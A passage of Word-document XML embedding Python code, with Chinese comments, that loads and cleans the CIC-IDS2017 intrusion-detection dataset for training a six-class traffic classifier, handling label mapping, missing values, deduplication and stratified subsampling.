        </w:rPr>
        <w:t xml:space="preserve">    for col in df.columns:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2413385C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if col.strip().lower() == "label":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D45D22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return col</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579D2589">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise SystemExit(f"找不到 Label 列，现有列名前 5 个：{list(df.columns)[:5]}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA7B282">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="558CE33A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6545D735">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def load_dataset(path, quick=None, seed=42):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E37E12B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """返回 X, y, 特征列名, meta。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE91B7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3707177B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    meta 是与 X/y 逐行对齐的元数据表（`__source__`、`__order__`），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43030DC7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    时间留出要靠它的 `__order__`。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB50C98">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043FBB3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df = pd.read_csv(path, low_memory=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3707322A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df.columns = [str(c).strip() for c in df.columns]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E3B82B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    label_col = find_label_column(df)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0DA6D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60416BF1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df = df[df[label_col].notna()].copy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156BACB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df["__label__"] = df[label_col].map(normalize_label).map(LABEL_MAP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3198A2F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    dropped = df["__label__"].isna().sum()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B903A06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if dropped:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45231F25">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        lost = df.loc[df["__label__"].isna(), label_col].value_counts()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A87EB3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[数据] 丢弃 {dropped} 行：不属于六类的标签 -&gt; {lost.to_dict()}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F6B64A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        df = df[df["__label__"].notna()]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF92492">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38DCEE28">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 双下划线开头的是元数据（__label__、以及抽样脚本写入的 __source__ / __order__），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA20478">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 不能当特征喂进模型，否则时间/跨天划分会用来源文件本身当预测依据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="687509F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    meta_cols = [c for c in df.columns if c.startswith("__")]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D5142C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    features = df.drop(columns=[label_col] + meta_cols)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B578328">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    features = features.apply(pd.to_numeric, errors="coerce")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEFBD8F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    features = features.replace([np.inf, -np.inf], np.nan)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5005FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4744A569">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    keep = features.notna().all(axis=1).to_numpy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33861F1F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (~keep).sum():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F04B66">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[数据] 丢弃 {(~keep).sum()} 行：含缺失值或无穷值", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C82F4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75E5EF40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X = features.to_numpy(dtype=np.float32)[keep]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23179FE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y = df["__label__"].to_numpy()[keep]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798AD5A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    meta = df.loc[keep, meta_cols].reset_index(drop=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496D474B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="486AF107">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    before = len(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FB285E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # CIC-IDS2017 自带重复行；用首现下标回填目标，别拿排好序的数组去索引</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24CE0B1C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    _, first_idx = np.unique(X, axis=0, return_index=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720E2A1F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if len(first_idx) &lt; before:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71ECB916">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sel = np.sort(first_idx)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059D23EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X, y, meta = X[sel], y[sel], meta.iloc[sel].reset_index(drop=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCDB07F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[数据] 去掉 {before - len(X)} 行重复", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D55CEAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76EBD0C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if quick and quick &lt; len(X):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C176A58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 抽下标而不是抽数组，否则 meta 与 X 的对应关系会断</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B36EDC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        _, _, idx_tr, _ = train_test_split(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21783F7F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            np.arange(len(X)), y, train_size=quick, stratify=y, random_state=seed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4929AF5F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07236D63">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sel = np.sort(idx_tr)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA61729">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X, y, meta = X[sel], y[sel], meta.iloc[sel].reset_index(drop=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CDF923">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[数据] --quick 抽样到 {len(X)} 行", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2311D92B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="523D123C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[数据] 最终 {X.shape[0]} 行 × {X.shape[1]} 维特征，类别分布：", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07564796">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for name, cnt in pd.Series(y).value_counts().items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C229DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"        {name:&lt;12} {cnt}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131825A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return X, y, list(features.columns), meta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F8254B">
      <w:pPr>
